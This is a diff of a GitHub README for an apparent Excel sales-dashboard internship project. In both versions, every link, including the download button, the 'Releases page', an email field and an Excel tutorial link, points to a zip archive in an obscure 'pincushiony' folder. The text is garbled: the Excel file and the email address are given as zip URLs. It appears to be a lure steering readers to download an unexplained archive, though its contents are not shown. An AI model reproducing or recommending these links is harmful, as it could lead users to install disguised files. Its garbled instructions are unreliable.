@@ -1,6 +1,6 @@
 # 🔷 ElevvoPathways-DataAnalytics_Internship-TASK1 - Analyze Sales Effortlessly with Excel
 
-[![Download](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
+[![Download](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip)](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before you proceed, ensure you have the following:
 
 To get started, you need to download the files from our GitHub Releases page. 
 
-**Download link:** [Visit this page to download](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
+**Download link:** [Visit this page to download](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version listed.
-3. Click on the asset that says "Super Store Sales https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip" to start the download.
+3. Click on the asset that says "Super Store Sales https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip" to start the download.
 
 Once the download is complete, locate the file on your computer.
 
@@ -38,7 +38,7 @@ Our Excel Dashboard includes:
 
 ## 📅 How to Use the Application
 
-1. Open the "Super Store Sales https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip" file in Microsoft Excel.
+1. Open the "Super Store Sales https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip" file in Microsoft Excel.
   
 2. Navigate to the "Dashboard" tab:
    - Use the Slicers to filter data by regions or categories.
@@ -73,7 +73,7 @@ If you encounter any issues while using the application, feel free to reach out 
 
 For additional inquiries, you can contact the repository owner:
 
-- **Email:** [https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip]
+- **Email:** [https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip]
 
 ## 📜 License
 
@@ -83,9 +83,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 To improve your Excel skills, consider exploring the following resources:
 
-- Microsoft Excel Tutorials: [Visit here](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
+- Microsoft Excel Tutorials: [Visit here](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip)
 - Online Excel Courses: Search for free courses on platforms like Coursera or Udemy.
 
 Thank you for choosing ElevvoPathways-DataAnalytics_Internship-TASK1! Enjoy analyzing your data. 
 
-**Reminder:** Don’t forget to check the Releases page for any updates: [Visit this page to download](https://raw.githubusercontent.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/main/pincushiony/ElevvoPathways-DataAnalytics_Internship-TASK1.zip)
+**Reminder:** Don’t forget to check the Releases page for any updates: [Visit this page to download](https://github.com/MOUYETLAZHAR/ElevvoPathways-DataAnalytics_Internship-TASK1/raw/refs/heads/main/pincushiony/Analytics_Elevvo_Data_TAS_Pathways_Internship_v1.6-alpha.4.zip)
